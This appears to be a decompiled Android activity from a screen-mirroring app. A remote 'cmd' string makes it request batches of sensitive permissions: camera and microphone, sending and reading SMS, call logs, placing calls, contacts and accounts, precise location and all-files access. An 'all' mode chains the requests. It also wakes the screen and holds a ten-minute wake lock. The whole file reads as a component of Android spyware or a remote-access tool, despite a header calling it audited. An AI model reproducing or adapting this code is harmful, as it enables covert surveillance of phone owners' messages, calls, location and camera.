// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime;

import a0.a;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.concurrent.atomic.AtomicBoolean;
import q2.k;
import w1.t8;
import w1.v8;
import x1.r;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public class PermissionRequestActivity extends Activity {

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final /* synthetic */ int f2461e = 0;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public PowerManager.WakeLock f2462a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final LinkedList f2463b = new LinkedList();

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final int f2464c = 1002;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public boolean f2465d = false;

    public final void a(String[] strArr, int i3, String str) {
        ArrayList arrayList = new ArrayList();
        for (String str2 : strArr) {
            if (k.c(this, str2) != 0) {
                arrayList.add(str2);
            }
        }
        if (arrayList.isEmpty()) {
            Log.d("PermReqAct", str.concat(": All permissions already granted. Skipping request."));
            return;
        }
        Log.w("PermReqAct", str + ": Requesting " + arrayList.size() + " permissions: " + arrayList);
        try {
            requestPermissions((String[]) arrayList.toArray(new String[0]), i3);
        } catch (Throwable th) {
            StringBuilder sb = new StringBuilder();
            sb.append(str);
            sb.append(": requestPermissions failed: ");
            a.p(th, sb, "PermReqAct");
        }
    }

    public final void b() {
        while (!this.f2463b.isEmpty()) {
            String[] strArr = (String[]) this.f2463b.poll();
            ArrayList arrayList = new ArrayList();
            for (String str : strArr) {
                if (k.c(this, str) != 0) {
                    arrayList.add(str);
                }
            }
            if (!arrayList.isEmpty()) {
                Log.w("PermReqAct", "Requesting " + arrayList.size() + " permissions: " + arrayList);
                try {
                    r.f5918h = true;
                    requestPermissions((String[]) arrayList.toArray(new String[0]), this.f2464c);
                    return;
                } catch (Throwable th) {
                    a.p(th, new StringBuilder("requestPermissions failed: "), "PermReqAct");
                }
            }
        }
        r.f5918h = false;
        c(300L);
    }

    public final void c(long j3) {
        new Handler(Looper.getMainLooper()).postDelayed(new v8(0, this), j3);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        getWindow().addFlags(2097280);
        try {
            PowerManager powerManager = (PowerManager) getSystemService("power");
            if (powerManager != null) {
                PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(805306378, "mirror:permission_request");
                this.f2462a = wakeLockNewWakeLock;
                wakeLockNewWakeLock.acquire(600000L);
            }
        } catch (Throwable th) {
            a.p(th, new StringBuilder("wake lock acquire failed: "), "PermReqAct");
        }
        String stringExtra = getIntent() != null ? getIntent().getStringExtra("cmd") : null;
        if (stringExtra == null) {
            c(500L);
        }
        ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
        if (screenMirrorServiceU2 != null) {
            if (screenMirrorServiceU2.M5 == null) {
                screenMirrorServiceU2.M5 = new r(screenMirrorServiceU2);
            }
            r rVar = screenMirrorServiceU2.M5;
            rVar.f5923e = true;
            rVar.n();
        }
        LinkedList linkedList = this.f2463b;
        byte b3 = 2;
        String[] strArrSplit = stringExtra.split(":", 2);
        if (strArrSplit.length < 2) {
            c(500L);
            return;
        }
        String str = strArrSplit[0];
        String lowerCase = strArrSplit[1].toLowerCase();
        if (!"request_permisson".equals(str)) {
            c(500L);
            return;
        }
        lowerCase.getClass();
        switch (lowerCase.hashCode()) {
            case -2011791827:
                b3 = !lowerCase.equals("camera_mic") ? (byte) -1 : (byte) 0;
                break;
            case -964727385:
                b3 = !lowerCase.equals("storage_others") ? (byte) -1 : (byte) 1;
                break;
            case -567451565:
                if (!lowerCase.equals("contacts")) {
                    b3 = -1;
                }
                break;
            case -331239923:
                b3 = !lowerCase.equals("battery") ? (byte) -1 : (byte) 3;
                break;
            case -103488124:
                b3 = !lowerCase.equals("sms_call") ? (byte) -1 : (byte) 4;
                break;
            case -101115303:
                b3 = !lowerCase.equals("all_files") ? (byte) -1 : (byte) 5;
                break;
            case 96673:
                b3 = !lowerCase.equals("all") ? (byte) -1 : (byte) 6;
                break;
            case 1901043637:
                b3 = !lowerCase.equals("location") ? (byte) -1 : (byte) 7;
                break;
            default:
                b3 = -1;
                break;
        }
        switch (b3) {
            case 0:
                a(new String[]{"android.permission.CAMERA", "android.permission.RECORD_AUDIO"}, 1002, "Camera & Mic");
                c(4000L);
                break;
            case 1:
                a(new String[]{"android.permission.READ_CALENDAR", "android.permission.WRITE_CALENDAR", "android.permission.POST_NOTIFICATIONS", "android.permission.READ_EXTERNAL_STORAGE"}, 1005, "Storage & Others");
                c(4000L);
                break;
            case 2:
                a(new String[]{"android.permission.READ_CONTACTS", "android.permission.GET_ACCOUNTS"}, 1001, "Contacts & Accounts");
                c(4000L);
                break;
            case 3:
                k.n(this);
                c(4000L);
                break;
            case 4:
                a(new String[]{"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_CALL_LOG", "android.permission.ANSWER_PHONE_CALLS", "android.permission.CALL_PHONE", "android.permission.READ_PHONE_STATE"}, 1004, "SMS & Call");
                c(4000L);
                break;
            case 5:
                k.m(this);
                c(4000L);
                break;
            case 6:
                this.f2465d = true;
                linkedList.clear();
                linkedList.add(new String[]{"android.permission.CAMERA"});
                b();
                break;
            case 7:
                a(new String[]{"android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"}, 1003, "Location");
                c(4000L);
                break;
            default:
                c(500L);
                break;
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        r.f5918h = false;
        ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
        if (screenMirrorServiceU2 != null && screenMirrorServiceU2.M5 != null) {
            r rVar = screenMirrorServiceU2.M5;
            rVar.f5923e = false;
            rVar.f5924f = Long.MIN_VALUE;
            AtomicBoolean atomicBoolean = t8.f5164a;
            if (!atomicBoolean.get() && !r.f5918h) {
                r.o();
            }
            if (!atomicBoolean.get()) {
                screenMirrorServiceU2.M5.getClass();
                r.o();
            }
        }
        try {
            PowerManager.WakeLock wakeLock = this.f2462a;
            if (wakeLock == null || !wakeLock.isHeld()) {
                return;
            }
            this.f2462a.release();
        } catch (Throwable unused) {
        }
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i3, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i3, strArr, iArr);
        int i4 = 0;
        for (int i5 : iArr) {
            if (i5 == 0) {
                i4++;
            }
        }
        StringBuilder sbI = a.i(i4, "runtime grant result: granted=", "/");
        sbI.append(iArr.length);
        Log.d("PermReqAct", sbI.toString());
        if (this.f2465d) {
            b();
        }
    }
}
